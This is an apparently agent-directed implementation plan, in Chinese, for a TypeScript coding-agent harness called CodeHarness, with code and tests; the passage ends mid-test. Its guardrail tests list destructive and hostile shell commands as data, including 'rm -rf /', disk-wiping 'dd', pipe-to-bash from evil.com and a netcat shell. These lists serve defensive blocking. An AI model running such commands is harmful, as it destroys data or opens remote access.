# CodeHarness 实现计划

> **面向 agentic workers：** 必需子技能：使用 superpowers:subagent-driven-development（推荐）或 superpowers:executing-plans 来按任务逐个实现此计划。步骤使用 checkbox（`- [ ]`）语法进行跟踪。

**目标：** 构建一个具有确定性 5 层反馈闭环、可通过 mock LLM 测试的护栏、以及安全凭据存储的编码智能体 harness——通过 npm + Docker 分发，并配备 React WebUI。

**架构：** Agent 主循环（`while(!done)`）编排 LLM 调用 → 工具执行 → 护栏检查 → 5 层反馈管线 → 结果反馈。所有核心机制实现 TypeScript 接口，配合 `MockProvider` 进行确定性测试。WebUI 通过 EventEmitter/WebSocket 消费事件，与 harness 内核可清晰分离。

**技术栈：** TypeScript, Node.js 20+, vitest, OpenAI SDK (DeepSeek), keytar, Express + ws, React + Vite + shadcn/ui + Monaco Editor, Open Design（桌面应用）, Docker

## 全局约束

- **TDD 强制要求**：先写失败测试 → 验证红色 → 最小实现 → 验证绿色 → 提交
- **§A.4-C 硬性判据**：核心机制必须能通过 MockProvider 的确定性单元测试——不依赖真实 LLM
- **凭据不入代码/Git/日志/历史**：`.env`、`*.cred`、`secrets/` 均在 `.gitignore` 中
- **Node.js 20+**，TypeScript 5.x，ES modules（`"type": "module"`）
- **Import 路径**：`NodeNext` 模块解析，所有相对 import 须带 `.js` 扩展名（如 `import { Foo } from '../types.js'`，指向 `.ts` 源文件）
- **CI**：`.github/workflows/ci.yml` 必须包含 `unit-test` job，始终通过；触发分支为 `master`
- **Git 分支名**：统一使用 `master`
- **`.gitignore` 基线**：不得由 agent 自行补充条目；使用 SPEC §12.2 的基线内容创建
- **接口定义点**：`src/types.ts` 为所有共享接口的唯一定义点；其他模块（如 `provider.ts`）从 `types.ts` import，不做 re-export
- **每个主要模块一个 worktree**：在每个模块组之前使用 `superpowers:using-git-worktrees`
- **CLAUDE.md**：项目级持久指令文件，包含完整实现工作流（§4.6）。所有 subagent 派发 prompt 应引用此文件

---

## 文件结构

```
src/
  types.ts                         # 所有共享接口
  events.ts                        # 类型化 EventEmitter（harness-WebUI 桥接）
  core/
    main-loop.ts                   # Agent 主循环
    termination.ts                 # 停机判断器
  llm/
    provider.ts                    # LLMProvider 接口
    mock-provider.ts               # MockProvider（确定性，用于测试）
    deepseek-provider.ts           # DeepSeekProvider（真实，OpenAI SDK）
  tools/
    tool.ts                        # Tool 接口 + 注册表
    list-directory.ts              # 列出目录
    search-content.ts              # 搜索内容
    read-file.ts                   # 读取文件
    write-file.ts                  # 写入文件
    edit-file.ts                   # 编辑文件
    run-shell.ts                   # 执行 shell
    run-test.ts                    # 运行测试
  feedback/                        # 主力维度
    action-classifier.ts           # 动作分类器
    validator-selector.ts          # 校验器选择器
    validator-chain.ts             # 校验器链
    validators/
      eslint-validator.ts          # ESLint 校验器
      tsc-validator.ts             # TSC 校验器
      test-result-validator.ts     # 测试结果校验器
      shell-check-validator.ts     # Shell 检查校验器
      format-validator.ts          # 格式校验器
    failure-classifier.ts          # 失败分类器
    strategy-matcher.ts            # 策略匹配器
    round-manager.ts               # 轮次管理器
  guardrail/
    pattern-guard.ts               # 模式匹配护栏
    scope-fence.ts                 # 范围围栏
    hitl-manager.ts                # HITL 状态机
  memory/
    session-memory.ts              # 会话记忆
    project-memory.ts              # 项目记忆
    user-memory.ts                 # 用户记忆
    context-compressor.ts          # 上下文压缩器
  config/
    loader.ts                      # 配置加载器
    schema.ts                      # 配置接口 + 默认值
  credentials/
    store.ts                       # 凭据存储
    backends/
      backend.ts                   # CredentialBackend 接口
      keytar-backend.ts            # keytar 后端
      encrypted-file-backend.ts    # 加密文件后端
      env-backend.ts               # 环境变量后端
    secure-handle.ts               # 安全句柄
  webui/
    server.ts                      # Express + WebSocket 服务器
    api/sessions.ts, approvals.ts, keys.ts, config.ts
    client/                        # React SPA（Vite）
      src/App.tsx, main.tsx
      src/design-tokens.ts         # Open Design 导出的设计 token
      pages/Dashboard.tsx, SessionDetail.tsx, Settings.tsx
      components/MessageList.tsx, ApprovalCard.tsx, FileDiff.tsx
  cli/
    index.ts                       # CLI 入口
    commands/start.ts, key.ts, config.ts

tests/
  unit/                            # 镜像 src/ 结构
  integration/
    main-loop.test.ts              # 主循环集成测试
    webui-api.test.ts              # WebUI API 集成测试
  demo/                            # §A.6 机制演示
    guardrail-demo.test.ts         # 演示 1：护栏拦截
    feedback-demo.test.ts          # 演示 2：反馈闭环修正
    deep-dimension-demo.test.ts    # 演示 3：主力维度行为
```

---

### 任务 1：项目脚手架 + 核心类型 + 事件系统 ✅ — `0f16b22`

**涉及文件：**
- 创建：`package.json`、`tsconfig.json`、`vitest.config.ts`、`.gitignore`
- 创建：`src/types.ts`、`src/events.ts`
- 修改：`.github/workflows/ci.yml`
- 创建：`tests/unit/events.test.ts`

**产出：** 所有共享接口（Message、Session、Action、ToolResult、FeedbackResult、Config、Tool、LLMProvider、CredentialBackend、Validator），类型化 EventEmitter 桥接，完整的 `.gitignore` 基线。

**完成条件：** `npm install` 无报错；`npx tsc --noEmit` 通过；`npx vitest run` 3 个测试全部通过；`cat .gitignore | wc -l` 输出 45 行（与 SPEC §12.2 基线一致）；`.gitignore` 中不应出现与项目无关的目录（如 `.codex/`、`.agents/`、`__pycache__/` 等——这些是 agent 训练数据带来的幻觉条目，不得存在）。

- [ ] **步骤 1：初始化 npm 项目并编写 package.json**

```bash
mkdir -p src/core src/llm src/tools src/feedback/validators src/guardrail src/memory src/config src/credentials/backends src/webui/api src/webui/client src/cli/commands tests/unit tests/integration tests/demo
```

```json
{
  "name": "codeharness", "version": "0.1.0", "type": "module",
  "bin": { "codeharness": "./dist/cli/index.js" },
  "scripts": {
    "build": "tsc",
    "test": "vitest run",
    "test:watch": "vitest",
    "start": "node dist/cli/index.js"
  },
  "dependencies": {
    "commander": "^12.0.0", "openai": "^4.70.0", "keytar": "^7.9.0",
    "express": "^4.21.0", "ws": "^8.18.0"
  },
  "devDependencies": {
    "typescript": "^5.6.0", "vitest": "^2.1.0", "@types/node": "^22.0.0",
    "@types/express": "^4.17.0", "@types/ws": "^8.5.0"
  }
}
```

- [ ] **步骤 1.5：创建 .gitignore**

按照 SPEC §12.2 的基线内容创建 `.gitignore`，一字不差。不得自行添加额外条目，不得从 agent 训练数据中补充。

- [ ] **步骤 2：编写 tsconfig.json**

```json
{
  "compilerOptions": {
    "target": "ES2022", "module": "NodeNext", "moduleResolution": "NodeNext",
    "outDir": "./dist", "rootDir": "./src", "strict": true,
    "esModuleInterop": true, "declaration": true, "skipLibCheck": true
  },
  "include": ["src/**/*.ts"], "exclude": ["tests", "src/webui/client"]
}
```

- [ ] **步骤 3：编写 vitest.config.ts**

```typescript
import { defineConfig } from 'vitest/config';
export default defineConfig({
  test: { include: ['tests/**/*.test.ts'], globals: true }
});
```

- [ ] **步骤 4：编写 src/types.ts——所有共享接口**

```typescript
export interface Message {
  id: string;
  role: 'user' | 'assistant' | 'tool' | 'system' | 'feedback';
  content: string;
  metadata?: {
    toolName?: string; toolInput?: Record<string, unknown>;
    toolResult?: ToolResult; feedbackResult?: FeedbackResult;
    approvalRequired?: boolean; important?: boolean; compressed?: boolean;
  };
  timestamp: string;
}

export interface Session {
  id: string; task: string;
  status: 'running' | 'paused' | 'completed' | 'failed';
  maxRounds: number; currentRound: number;
  messages: Message[]; tokenCount: number;
  createdAt: string; updatedAt: string;
}

export interface Action {
  tool: string;
  params: Record<string, unknown>;
}

export interface ToolResult {
  success: boolean;
  output?: string;
  error?: string;
  duration_ms: number;
  filesChanged?: string[];
  exitCode?: number | null;
}

export interface FeedbackResult {
  passed: boolean;
  validator: string;
  failureCategory?: 'syntax' | 'type' | 'logic' | 'command' | 'timeout' | 'parse_error';
  strategy?: 'auto_fix' | 'targeted_fix' | 'logic_fix' | 'command_fix' | 'split_task' | 'format_retry';
  evidence: string;
  details?: { file?: string; line?: number; expected?: string; actual?: string; rule?: string; }[];
}

export interface Tool {
  name: string; description: string; parameters: Record<string, unknown>;
  execute(params: Record<string, unknown>, context: ToolContext): Promise<ToolResult>;
}

export interface ToolContext { workspaceRoot: string; }

export interface LLMProvider {
  complete(messages: Message[], tools: Tool[]): Promise<LLMResponse>;
}

export interface LLMResponse {
  content: string | null;
  toolCalls?: { name: string; arguments: Record<string, unknown> }[];
}

export interface Validator {
  name: string;
  validate(action: Action, result: ToolResult, context: ValidatorContext): Promise<FeedbackResult>;
}

export interface ValidatorContext { workspaceRoot: string; }
```

- [ ] **步骤 5：编写 src/events.ts——类型化 EventEmitter**

```typescript
import { EventEmitter } from 'events';

export interface HarnessEventMap {
  'message:added': { id: string; role: string; content: string; metadata?: Record<string, unknown>; timestamp: string };
  'tool:executed': { toolName: string; duration_ms: number; success: boolean };
  'feedback:completed': { passed: boolean; validator: string; failureCategory?: string };
  'guardrail:triggered': { rule: string; command: string; level: 'block' | 'warn' };
  'session:status': { sessionId: string; status: string };
  'round:changed': { currentRound: number; maxRounds: number };
}

export interface HarnessEvents {
  on<E extends keyof HarnessEventMap>(event: E, handler: (data: HarnessEventMap[E]) => void): void;
  off<E extends keyof HarnessEventMap>(event: E, handler: (data: HarnessEventMap[E]) => void): void;
  emit<E extends keyof HarnessEventMap>(event: E, data: HarnessEventMap[E]): void;
}

export function createEventBus(): HarnessEvents {
  const emitter = new EventEmitter();
  return {
    on(event, handler) { emitter.on(event, handler); },
    off(event, handler) { emitter.off(event, handler); },
    emit(event, data) { emitter.emit(event, data); },
  };
}
```

- [ ] **步骤 6：编写 tests/unit/events.test.ts——EventBus 的 TDD 测试**

```typescript
import { describe, it, expect, vi } from 'vitest';
import { createEventBus } from '../../src/events.js';

describe('EventBus', () => {
  it('能够发送和接收 message:added 事件', () => {
    const bus = createEventBus();
    const handler = vi.fn();
    bus.on('message:added', handler);
    bus.emit('message:added', { id: '1', role: 'user', content: 'hello', timestamp: '' });
    expect(handler).toHaveBeenCalledWith({ id: '1', role: 'user', content: 'hello', timestamp: '' });
  });

  it('支持同一事件的多个处理函数', () => {
    const bus = createEventBus();
    const h1 = vi.fn(), h2 = vi.fn();
    bus.on('tool:executed', h1);
    bus.on('tool:executed', h2);
    bus.emit('tool:executed', { toolName: 'read_file', duration_ms: 10, success: true });
    expect(h1).toHaveBeenCalled();
    expect(h2).toHaveBeenCalled();
  });

  it('能够通过 off() 移除处理函数', () => {
    const bus = createEventBus();
    const handler = vi.fn();
    bus.on('guardrail:triggered', handler);
    bus.off('guardrail:triggered', handler);
    bus.emit('guardrail:triggered', { rule: 'rm', command: 'rm -rf /', level: 'block' });
    expect(handler).not.toHaveBeenCalled();
  });
});
```

- [ ] **步骤 7：更新 CI 配置**

修改 `.github/workflows/ci.yml`——将 TODO 模板替换为生产步骤：触发分支为 `master`（不是 `main`）；checkout → setup-node@v4（node 20, cache: 'npm'）→ npm ci → npm test。

> ⚠️ **确认点**：如 agent 不确定当前 repo 的默认分支名，应查看 `git branch` 或 `.git/HEAD` 确认，不得假设为 `main`。

- [ ] **步骤 8：安装、编译、测试、提交**

```bash
npm install
npx tsc --noEmit
npx vitest run tests/unit/events.test.ts
git add package.json package-lock.json tsconfig.json vitest.config.ts src/types.ts src/events.ts tests/unit/events.test.ts .github/workflows/ci.yml
git commit -m "feat: project scaffolding, core types, EventEmitter bridge, CI config"
```

预期：`tsc` 通过，events 测试通过（3/3）。

---

### 任务 2：LLMProvider 接口 + MockProvider ✅ — `3ff7841`

**涉及文件：**
- 创建：`src/llm/provider.ts`、`src/llm/mock-provider.ts`
- 创建：`tests/unit/llm/mock-provider.test.ts`

**产出：** `LLMProvider` 接口（定义在 `src/types.ts`，`provider.ts` 从 `types.ts` import 使用，**不做 re-export**），`MockProvider` 类，支持按序注入响应 + `remaining` 计数器。

**完成条件：** `npx vitest run tests/unit/llm/` 4 个测试全部通过；MockProvider 满足 §A.4-C 判据（不依赖真实 LLM）。

- [ ] **步骤 1：编写失败测试**

`tests/unit/llm/mock-provider.test.ts`——4 个测试：
1. 按序返回响应（注入 2 个响应，调用 complete 两次，断言顺序）
2. 返回 tool calls（注入带 toolCalls 的响应，断言 name + arguments）
3. 响应耗尽时抛出异常（空数组 → complete → 期望 throw）
4. 暴露剩余计数（new MockProvider(2 个响应) → remaining = 2）

运行：`npx vitest run tests/unit/llm/mock-provider.test.ts` → 失败。

- [ ] **步骤 2：创建 provider 模块文件**

`src/llm/provider.ts`：从 `../types.js` import `LLMProvider`、`LLMResponse` 接口。此文件是 provider 相关逻辑的入口模块，**不是接口的 re-export 文件**——接口定义在 `types.ts`。

`src/llm/mock-provider.ts`：class MockProvider，构造函数 `(responses: LLMResponse[])`，跟踪索引，耗尽时抛出异常。

- [ ] **步骤 3：运行测试 → 通过，提交**

运行：`npx vitest run tests/unit/llm/mock-provider.test.ts` → 4 通过。
提交：`feat: LLMProvider interface + MockProvider with ordered response injection`

---

### 任务 3：DeepSeekProvider ✅ — `ffab869`

**涉及文件：**
- 创建：`src/llm/deepseek-provider.ts`
- 创建：`tests/unit/llm/deepseek-provider.test.ts`

**产出：** `DeepSeekProvider` 类——封装 OpenAI SDK，将消息 + 工具格式化为 OpenAI 格式，从响应中解析 tool_calls。

- [ ] **步骤 1：使用 vi.mock 编写测试**

Mock `openai` 模块：`chat.completions.create` 返回受控响应。测试消息格式化、工具格式化和响应解析是否正确。

- [ ] **步骤 2：实现 DeepSeekProvider**

构造函数接受 `{ baseUrl, apiKey, model, maxTokens }`。将消息格式化为 OpenAI 格式。将工具格式化为 function-calling 格式。将 `tool_calls` 解析回 `{ name, arguments }`。

- [ ] **步骤 3：运行测试 → 通过，提交**

提交：`feat: DeepSeekProvider using OpenAI SDK with tool calling support`

---

### 任务 4：Tool 接口 + 只读工具 ✅ — `4f639b0`

**涉及文件：**
- 创建：`src/tools/tool.ts`、`src/tools/list-directory.ts`、`src/tools/search-content.ts`、`src/tools/read-file.ts`
- 创建：`tests/unit/tools/tool.test.ts`、`tests/unit/tools/list-directory.test.ts`、`tests/unit/tools/search-content.test.ts`、`tests/unit/tools/read-file.test.ts`

**产出：** `ToolRegistry` 类、`ListDirectoryTool`、`SearchContentTool`、`ReadFileTool`。

- [ ] **步骤 1：Tool 注册表 TDD**——register/get/names/list → 实现 → 通过
- [ ] **步骤 2：list_directory TDD**——列出目录内容、不存在的路径报错 → 实现 → 通过
- [ ] **步骤 3：search_content TDD**——按模式在文件中匹配、workspaceRoot 边界检查 → 实现 → 通过
- [ ] **步骤 4：read_file TDD**——读取文件内容并带行号、文件不存在 → 实现 → 通过
- [ ] **步骤 5：运行所有工具测试 → 通过，提交**

提交：`feat: tool interface, registry, and read-only tools (list_directory, search_content, read_file)`

---

### 任务 5：写入 + 执行工具 ✅ — `6e997bc`

**涉及文件：**
- 创建：`src/tools/write-file.ts`、`src/tools/edit-file.ts`、`src/tools/run-shell.ts`、`src/tools/run-test.ts`
- 创建：`tests/unit/tools/write-file.test.ts`、`tests/unit/tools/edit-file.test.ts`、`tests/unit/tools/run-shell.test.ts`、`tests/unit/tools/run-test.test.ts`

**产出：** `WriteFileTool`、`EditFileTool`、`RunShellTool`、`RunTestTool`。

- [ ] **步骤 1：write_file TDD**——写入 → 读回 → 断言内容一致；workspaceRoot 边界检查 → 实现 → 通过
- [ ] **步骤 2：edit_file TDD**——精确字符串替换；oldString 不唯一时报错 → 实现 → 通过
- [ ] **步骤 3：run_shell TDD**——echo 命令；exit code ≠ 0；超时 → 实现 → 通过（使用 `child_process.execSync`，锁定 cwd + 环境变量白名单）
- [ ] **步骤 4：run_test TDD**——委托给 run_shell，解析 vitest 输出 → 实现 → 通过
- [ ] **步骤 5：运行所有工具测试 → 通过，提交**

提交：`feat: write tools (write_file, edit_file) + execution tools (run_shell, run_test)`

---

### 任务 6：配置系统 ✅ — `7bb8aff`

**涉及文件：**
- 创建：`src/config/schema.ts`、`src/config/loader.ts`
- 创建：`tests/unit/config/loader.test.ts`

**产出：** 带默认值的 `Config` 接口，`loadConfig(cliArgs?)` 支持 3 层覆盖（用户级 `~/.codeharness/config.json` → 项目级 `.codeharness.json` → CLI 参数）。

Config 接口包含：`llm`（provider、baseUrl、model、maxTokens、apiKeySource、apiKeyService）、`agent`（maxRounds: 3、contextThreshold: 0.8、workspaceRoot）、`feedback`（validatorMode、各 validators 的 enable 标志）、`guardrail`（allowlist、blocklist、warnlist、downgrade）、`shell`（timeoutSeconds: 60）、`memory`（projectPath、userPath）、`webui`（port: 3000、token?）。

- [ ] **步骤 1：编写失败测试**——无配置文件 → 默认值；项目配置覆盖默认值；CLI 参数覆盖两者；深度合并
- [ ] **步骤 2：实现 schema + loader** → 通过所有测试
- [ ] **步骤 3：提交**

提交：`feat: config system with 3-layer overlay and full schema`

---

### 任务 7：记忆系统 ✅ — `589fd06`

**涉及文件：**
- 创建：`src/memory/session-memory.ts`、`src/memory/project-memory.ts`、`src/memory/user-memory.ts`、`src/memory/context-compressor.ts`
- 创建：`tests/unit/memory/context-compressor.test.ts`、`tests/unit/memory/project-memory.test.ts`

**产出：** 3 层记忆（带上下文窗口管理的会话记忆、`.harness/` markdown 项目记忆、`~/.codeharness/` markdown 用户记忆）。

- [ ] **步骤 1：上下文压缩器 TDD**——token 估算（字符数/4）、低于阈值不压缩、超过阈值压缩最旧消息 + 保留最近 8 轮全文 + important 消息永不压缩 → 实现 → 通过
- [ ] **步骤 2：会话记忆 TDD**——添加/获取消息、在 80% 阈值时触发压缩 → 实现 → 通过
- [ ] **步骤 3：项目记忆 TDD**——读写 `.harness/conventions.md` 等 → 实现 → 通过
- [ ] **步骤 4：用户记忆 TDD**——读取 `~/.codeharness/preferences.md` → 实现 → 通过
- [ ] **步骤 5：运行所有记忆测试 → 通过，提交**

提交：`feat: 3-layer memory system with deterministic context compressor`

---

### 任务 8：PatternGuard ✅ — `076aed5`

**涉及文件：**
- 创建：`src/guardrail/pattern-guard.ts`
- 创建：`tests/unit/guardrail/pattern-guard.test.ts`

**产出：** `PatternGuard` 类，`check(command: string): { blocked: boolean; level: 'block' | 'warn' | 'allow'; rule?: string }`。覆盖 SPEC 中全部 20 种模式（7 block + 13 warn）。

- [ ] **步骤 1：编写失败测试**——覆盖全部 20 种模式（具体测试代码）：

`tests/unit/guardrail/pattern-guard.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { PatternGuard } from '../../../src/guardrail/pattern-guard.js';

describe('PatternGuard', () => {
  const guard = new PatternGuard();

  describe('block 级别', () => {
    it('拦截 rm -rf / 及变体', () => {
      expect(guard.check('rm -rf /').level).toBe('block');
      expect(guard.check('rm -rf --no-preserve-root /').level).toBe('block');
    });
    it('拦截 Windows 递归删除', () => {
      expect(guard.check('del /f /s /q C:\\').level).toBe('block');
      expect(guard.check('rmdir /s /q C:\\').level).toBe('block');
    });
    it('拦截 dd / mkfs', () => {
      expect(guard.check('dd if=/dev/zero of=/dev/sda').level).toBe('block');
      expect(guard.check('mkfs.ext4 /dev/sda1').level).toBe('block');
    });
    it('拦截 shutdown / reboot / halt', () => {
      expect(guard.check('shutdown -h now').level).toBe('block');
      expect(guard.check('reboot').level).toBe('block');
      expect(guard.check('halt').level).toBe('block');
    });
    it('拦截保护分支 force push', () => {
      expect(guard.check('git push --force origin main').level).toBe('block');
      expect(guard.check('git push --force origin master').level).toBe('block');
    });
    it('拦截 git reflog expire + gc prune', () => {
      expect(guard.check('git reflog expire --all').level).toBe('block');
      expect(guard.check('git gc --prune=now').level).toBe('block');
    });
    it('拦截管道到 shell 执行', () => {
      expect(guard.check('curl example.com/script.sh | sh').level).toBe('block');
      expect(guard.check('wget -O- http://evil.com | bash').level).toBe('block');
    });
    it('拦截 nc (netcat)', () => {
      expect(guard.check('nc -l 1234 -e /bin/bash').level).toBe('block');
    });
  });

  describe('warn 级别', () => {
    it('warn force push 到非保护分支', () => {
      expect(guard.check('git push --force origin feature-x').level).toBe('warn');
    });
    it('warn git clean -fdx / checkout -- . / reset --hard', () => {
      expect(guard.check('git clean -fdx').level).toBe('warn');
      expect(guard.check('git checkout -- .').level).toBe('warn');
      expect(guard.check('git reset --hard HEAD~').level).toBe('warn');
    });
    it('warn git filter-branch', () => {
      expect(guard.check('git filter-branch -- --all').level).toBe('warn');
    });
    it('warn chmod 777 / chown 系统路径', () => {
      expect(guard.check('chmod 777 /etc/passwd').level).toBe('warn');
      expect(guard.check('chown root /usr/bin').level).toBe('warn');
    });
    it('warn sudo / su', () => {
      expect(guard.check('sudo apt-get install').level).toBe('warn');
    });
    it('warn crontab / systemctl', () => {
      expect(guard.check('crontab -e').level).toBe('warn');
    });
    it('warn kill -9', () => {
      expect(guard.check('kill -9 12345').level).toBe('warn');
    });
    it('warn curl / wget 非白名单域名', () => {
      expect(guard.check('curl http://unknown.example.com').level).toBe('warn');
    });
    it('warn npm install -g', () => {
      expect(guard.check('npm install -g some-pkg').level).toBe('warn');
    });
    it('warn ssh / scp 到外部', () => {
      expect(guard.check('ssh user@remote.example.com').level).toBe('warn');
    });
    it('warn docker rm -f / system prune', () => {
      expect(guard.check('docker rm -f mycontainer').level).toBe('warn');
      expect(guard.check('docker system prune -af').level).toBe('warn');
    });
    it('warn DROP TABLE / DATABASE / TRUNCATE', () => {
      expect(guard.check('DROP TABLE users').level).toBe('warn');
      expect(guard.check('DROP DATABASE production').level).toBe('warn');
      expect(guard.check('TRUNCATE TABLE orders').level).toBe('warn');
    });
  });

  describe('放行', () => {
    it('放行普通 git push', () => {
      expect(guard.check('git push origin main').level).toBe('allow');
    });
    it('放行 npm test', () => {
      expect(guard.check('npm test').level).toBe('allow');
    });
    it('放行普通 echo', () => {
      expect(guard.check('echo hello').level).toBe('allow');
    });
  });
});
```

运行：`npx vitest run tests/unit/guardrail/pattern-guard.test.ts` → FAIL（PatternGuard 类未定义）。

- [ ] **步骤 2：实现基于正则的模式匹配** → 通过以上所有测试
- [ ] **步骤 3：提交**

提交：`feat: PatternGuard with 20 dangerous command patterns (7 block + 13 warn)`

---

### 任务 9：ScopeFence + HITLManager ✅ — `dad85c4`

**涉及文件：**
- 创建：`src/guardrail/scope-fence.ts`、`src/guardrail/hitl-manager.ts`
- 创建：`tests/unit/guardrail/scope-fence.test.ts`、`tests/unit/guardrail/hitl-manager.test.ts`

**产出：** `ScopeFence`（路径边界、环境变量白名单）、`HITLManager` 状态机（无超时）。

- [ ] **步骤 1：ScopeFence TDD**——workspace 内路径放行、外部路径拦截、`../../etc` 路径穿越拦截、环境变量过滤 → 实现 → 通过
- [ ] **步骤 2：HITLManager 状态机 TDD**

`tests/unit/guardrail/hitl-manager.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { HITLManager } from '../../../src/guardrail/hitl-manager.js';

describe('HITLManager', () => {
  it('初始状态为 IDLE', () => {
    const m = new HITLManager();
    expect(m.state).toBe('IDLE');
  });

  it('收到危险动作后进入 AWAITING_APPROVAL', () => {
    const m = new HITLManager();
    m.requestApproval({ command: 'rm -rf /', rule: 'dangerous_delete' });
    expect(m.state).toBe('AWAITING_APPROVAL');
  });

  it('用户批准 → EXECUTING，携带原始命令', () => {
    const m = new HITLManager();
    m.requestApproval({ command: 'rm -rf /', rule: 'dangerous_delete' });
    const decision = m.approve();
    expect(m.state).toBe('EXECUTING');
    expect(decision.command).toBe('rm -rf /');
    expect(decision.modified).toBe(false);
  });

  it('用户批准带修改 → EXECUTING_MODIFIED，携带修改后命令', () => {
    const m = new HITLManager();
    m.requestApproval({ command: 'rm -rf /', rule: 'dangerous_delete' });
    const decision = m.approveWithModification('rm -rf ./tmp');
    expect(m.state).toBe('EXECUTING_MODIFIED');
    expect(decision.command).toBe('rm -rf ./tmp');
    expect(decision.modified).toBe(true);
  });

  it('用户拒绝 → BLOCKED', () => {
    const m = new HITLManager();
    m.requestApproval({ command: 'rm -rf /', rule: 'dangerous_delete' });
    m.deny();
    expect(m.state).toBe('BLOCKED');
  });

  it('已在 EXECUTING 状态时不能再次批准', () => {
    const m = new HITLManager();
    m.requestApproval({ command: 'rm -rf /', rule: 'dangerous_delete' });
    m.approve();
    expect(() => m.approve()).toThrow('not in AWAITING_APPROVAL state');
  });

  it('无超时机制——AWAITING_APPROVAL 状态可无限等待', async () => {
    const m = new HITLManager();
    m.requestApproval({ command: 'kill -9 12345', rule: 'force_kill' });
    // 等待模拟时间后，状态仍为 AWAITING_APPROVAL
    await new Promise(r => setTimeout(r, 100));
    expect(m.state).toBe('AWAITING_APPROVAL');
  });

  it('reset() 从任意状态回到 IDLE', () => {
    const m = new HITLManager();
    m.requestApproval({ command: 'sudo ls', rule: 'sudo' });
    m.deny();
    m.reset();
    expect(m.state).toBe('IDLE');
  });
});
```

运行：`npx vitest run tests/unit/guardrail/` → 全部 FAIL（类未定义）。

- [ ] **步骤 3：实现 ScopeFence + HITLManager** → 通过以上所有测试 → 提交

提交：`feat: ScopeFence (path/env boundary) + HITLManager (no-timeout state machine)`

---

### 任务 10：ActionClassifier + ValidatorSelector ✅ — `a57970a`

**涉及文件：**
- 创建：`src/feedback/action-classifier.ts`、`src/feedback/validator-selector.ts`
- 创建：`tests/unit/feedback/action-classifier.test.ts`、`tests/unit/feedback/validator-selector.test.ts`

**产出：** `ActionClassifier`（动作 → ActionType）、`ValidatorSelector`（ActionType + config → Validator[]）。

- [ ] **步骤 1：ActionClassifier TDD**——`file_write`（write/edit_file 作用于 .ts/.js/.json）、`file_read`（read_file/list_dir/search）、`test_run`（vitest/jest/test 模式）、`typecheck_run`（tsc）、`shell_command`（其他） → 实现 → 通过
- [ ] **步骤 2：ValidatorSelector TDD**——file_write → [eslint, tsc]；test_run → [exitCode, testResult]；shell_command → [exitCode, stderr]；typecheck_run → [exitCode, tscOutput]；file_read → []；禁用的校验器被跳过 → 实现 → 通过
- [ ] **步骤 3：提交**

提交：`feat: ActionClassifier + ValidatorSelector (feedback layers 1-2)`

---

### 任务 11a：ValidatorChain + EslintValidator + TscValidator ✅ — `827e157`

**涉及文件：**
- 创建：`src/feedback/validator-chain.ts`
- 创建：`src/feedback/validators/eslint-validator.ts`、`tsc-validator.ts`
- 创建：`tests/unit/feedback/validator-chain.test.ts`、`eslint-validator.test.ts`、`tsc-validator.test.ts`

**产出：** `ValidatorChain`（fail_fast / collect_all 双模式）、`EslintValidator`（调用 `npx eslint --format json` 并解析）、`TscValidator`（调用 `npx tsc --noEmit` 并解析）。ValidatorChain 用前两个校验器进行确定性集成测试。

**完成条件：** `npx vitest run tests/unit/feedback/validator-chain.test.ts tests/unit/feedback/eslint-validator.test.ts tests/unit/feedback/tsc-validator.test.ts` 全部通过；ValidatorChain fail_fast 和 collect_all 行为均被验证；两个校验器均在 mock 环境下通过确定性测试（不依赖项目实际 lint/typecheck 结果）。

- [ ] **步骤 1：ValidatorChain TDD**——fail_fast 首个失败即停；collect_all 运行全部校验器；全部通过 → Pass → 实现 → 通过
- [ ] **步骤 2：EslintValidator TDD**——运行 `npx eslint --format json`，解析错误 → 实现 → 通过
- [ ] **步骤 3：TscValidator TDD**——运行 `npx tsc --noEmit`，解析错误输出 → 实现 → 通过
- [ ] **步骤 4：运行所有测试 → 通过，提交**

提交：`feat: ValidatorChain + EslintValidator + TscValidator — feedback layer 3 (part 1)`

---

### 任务 11b：TestResultValidator + ShellCheckValidator + FormatValidator ✅ — `bc8d08f`

**涉及文件：**
- 创建：`src/feedback/validators/test-result-validator.ts`、`shell-check-validator.ts`、`format-validator.ts`
- 创建：`tests/unit/feedback/test-result-validator.test.ts`、`shell-check-validator.test.ts`、`format-validator.test.ts`

**产出：** `TestResultValidator`（解析 vitest/jest 输出）、`ShellCheckValidator`（exitCode + stderr 检查）、`FormatValidator`（Action JSON 结构验证，用于 parse_error）。三个校验器均实现 `Validator` 接口，注册到已有 ValidatorChain。

**完成条件：** `npx vitest run tests/unit/feedback/` 下所有测试（含 11a 的测试）全部通过；5 个校验器齐全，每个在 mock 环境下通过确定性测试。

- [ ] **步骤 1：TestResultValidator TDD**——解析 vitest/jest 输出中的失败项 → 实现 → 通过
- [ ] **步骤 2：ShellCheckValidator TDD**——exitCode ≠ 0 或 stderr 非空 → 失败 → 实现 → 通过
- [ ] **步骤 3：FormatValidator TDD**——验证 Action JSON 结构（用于 parse_error）→ 实现 → 通过
- [ ] **步骤 4：运行所有反馈测试 → 通过，提交**

提交：`feat: TestResultValidator + ShellCheckValidator + FormatValidator — feedback layer 3 (part 2)`

---

### 任务 12：FailureClassifier + StrategyMatcher + RoundManager ✅ — `b671b09`

**涉及文件：**
- 创建：`src/feedback/failure-classifier.ts`、`src/feedback/strategy-matcher.ts`、`src/feedback/round-manager.ts`
- 创建：`tests/unit/feedback/failure-classifier.test.ts`、`tests/unit/feedback/strategy-matcher.test.ts`、`tests/unit/feedback/round-manager.test.ts`

**产出：** 3 个类，完成反馈 5 层管线。

- [ ] **步骤 1：FailureClassifier TDD**——eslint → syntax；tsc → type；测试断言 → logic；exitCode/stderr → command；超时 → timeout；格式错误 → parse_error → 实现 → 通过
- [ ] **步骤 2：StrategyMatcher TDD**——syntax → auto_fix；type → targeted_fix；logic → logic_fix；command → command_fix；timeout → split_task；parse_error → format_retry → 实现 → 通过
- [ ] **步骤 3：RoundManager TDD**——核心测试代码：

`tests/unit/feedback/round-manager.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { RoundManager } from '../../../src/feedback/round-manager.js';

describe('RoundManager', () => {
  it('新建时 currentRound 为 1，shouldUpgrade 为 false', () => {
    const rm = new RoundManager(3);
    expect(rm.currentRound).toBe(1);
    expect(rm.shouldUpgrade()).toBe(false);
  });

  it('第 2 轮不升级', () => {
    const rm = new RoundManager(3);
    rm.nextRound();
    expect(rm.currentRound).toBe(2);
    expect(rm.shouldUpgrade()).toBe(false);
  });

